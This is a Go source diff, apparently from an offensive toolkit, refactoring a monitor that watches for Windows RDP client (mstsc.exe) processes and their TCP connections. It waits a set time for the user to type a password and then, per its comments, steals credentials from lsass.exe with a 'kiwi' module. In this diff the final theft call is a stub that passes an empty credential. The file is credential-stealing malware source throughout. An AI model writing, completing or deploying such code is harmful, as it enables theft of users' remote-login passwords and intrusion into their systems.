@@ -12,12 +12,13 @@ import (
 	"project/internal/module/taskmgr"
 	"project/internal/module/windows/kiwi"
 	"project/internal/nettool"
+	"project/internal/xpanic"
 	"project/internal/xsync"
 )
 
-// DefaultWaitTime is the wait time to steal password that find mstsc.exe
+// DefaultStealWaitTime is the wait time to steal password that find mstsc.exe
 // process and establish connection.
-const DefaultWaitTime = 15 * time.Second
+const DefaultStealWaitTime = 15 * time.Second
 
 // Handler is used to receive stolen credential.
 type Handler func(local, remote string, pid int64, cred *kiwi.Credential)
@@ -26,9 +27,9 @@ type Handler func(local, remote string, pid int64, cred *kiwi.Credential)
 // establish connection, then wait some second for wait user input password,
 // finally, use kiwi to steal password from lsass.exe
 type Monitor struct {
-	logger   logger.Logger
-	handler  Handler
-	waitTime time.Duration
+	logger        logger.Logger
+	handler       Handler
+	stealWaitTime time.Duration
 
 	processMonitor *taskmgr.Monitor
 	connMonitor    *netmon.Monitor
@@ -39,26 +40,34 @@ type Monitor struct {
 
 	mu sync.Mutex
 
+	ctx     context.Context
+	cancel  context.CancelFunc
 	counter xsync.Counter
 }
 
-type MonitorOptions struct {
-	WaitTime               time.Duration
+// Options contains options about monitor.
+type Options struct {
+	StealWaitTime          time.Duration
 	ProcessMonitorInterval time.Duration
 	ConnMonitorInterval    time.Duration
 }
 
 // NewMonitor is used to create a new kiwi monitor.
-func NewMonitor(logger logger.Logger, handler Handler, opts *MonitorOptions) (*Monitor, error) {
+func NewMonitor(logger logger.Logger, handler Handler, opts *Options) (*Monitor, error) {
 	if opts == nil {
-		opts = new(MonitorOptions)
+		opts = new(Options)
 	}
 	monitor := Monitor{
-		logger:       logger,
-		handler:      handler,
-		waitTime:     opts.WaitTime,
-		watchPIDList: make(map[int64]struct{}),
+		logger:        logger,
+		handler:       handler,
+		stealWaitTime: opts.StealWaitTime,
+		watchPIDList:  make(map[int64]struct{}),
 	}
+	if monitor.stealWaitTime == 0 {
+		monitor.stealWaitTime = DefaultStealWaitTime
+	}
+	monitor.ctx, monitor.cancel = context.WithCancel(context.Background())
+	// initialize process monitor
 	processMonitor, err := taskmgr.NewMonitor(logger, monitor.processMonitorHandler)
 	if err != nil {
 		return nil, errors.WithMessage(err, "failed to create process monitor")
@@ -66,6 +75,7 @@ func NewMonitor(logger logger.Logger, handler Handler, opts *MonitorOptions) (*M
 	if opts.ProcessMonitorInterval != 0 {
 		processMonitor.SetInterval(opts.ProcessMonitorInterval)
 	}
+	// initialize connection monitor
 	connMonitor, err := netmon.NewMonitor(logger, monitor.connMonitorHandler)
 	if err != nil {
 		processMonitor.Close()
@@ -74,11 +84,14 @@ func NewMonitor(logger logger.Logger, handler Handler, opts *MonitorOptions) (*M
 	if opts.ConnMonitorInterval != 0 {
 		connMonitor.SetInterval(opts.ConnMonitorInterval)
 	}
+	// prevent watch connection first
+	interval := processMonitor.GetInterval()
+	if connMonitor.GetInterval() < interval {
+		connMonitor.SetInterval(interval)
+	}
+	// set struct fields
 	monitor.processMonitor = processMonitor
 	monitor.connMonitor = connMonitor
-	if monitor.waitTime == 0 {
-		monitor.waitTime = DefaultWaitTime
-	}
 	return &monitor, nil
 }
 
@@ -122,10 +135,16 @@ func (mon *Monitor) connMonitorHandler(_ context.Context, event uint8, data inte
 		switch conn := conn.(type) {
 		case *netmon.TCP4Conn:
 			pid = conn.PID
+			if _, ok := mon.watchPIDList[pid]; !ok {
+				continue
+			}
 			local = nettool.JoinHostPort(conn.LocalAddr.String(), conn.LocalPort)
 			remote = nettool.JoinHostPort(conn.RemoteAddr.String(), conn.RemotePort)
 		case *netmon.TCP6Conn:
 			pid = conn.PID
+			if _, ok := mon.watchPIDList[pid]; !ok {
+				continue
+			}
 			local = nettool.JoinHostPort(conn.LocalAddr.String(), conn.LocalPort)
 			remote = nettool.JoinHostPort(conn.RemoteAddr.String(), conn.RemotePort)
 		}
@@ -134,4 +153,40 @@ func (mon *Monitor) connMonitorHandler(_ context.Context, event uint8, data inte
 			go mon.stealCredential(local, remote, pid)
 		}
 	}
+}
+
+func (mon *Monitor) stealCredential(local, remote string, pid int64) {
+	defer mon.counter.Done()
+	defer func() {
+		if r := recover(); r != nil {
+			mon.log(logger.Fatal, xpanic.Print(r, "Monitor.stealCredential"))
+		}
+	}()
+	// wait user input password
+	timer := time.NewTimer(mon.stealWaitTime)
+	defer timer.Stop()
+	select {
+	case <-timer.C:
+	case <-mon.ctx.Done():
+		return
+	}
+	// steal credential
+
+	mon.handler(local, remote, pid, nil)
+}
+
+// Close is used to close kiwi monitor.
+func (mon *Monitor) Close() {
+	mon.cancel()
+	mon.mu.Lock()
+	defer mon.mu.Unlock()
+	if mon.processMonitor != nil {
+		mon.processMonitor.Close()
+		mon.processMonitor = nil
+	}
+	if mon.connMonitor != nil {
+		mon.connMonitor.Close()
+		mon.connMonitor = nil
+	}
+	mon.counter.Wait()
 }
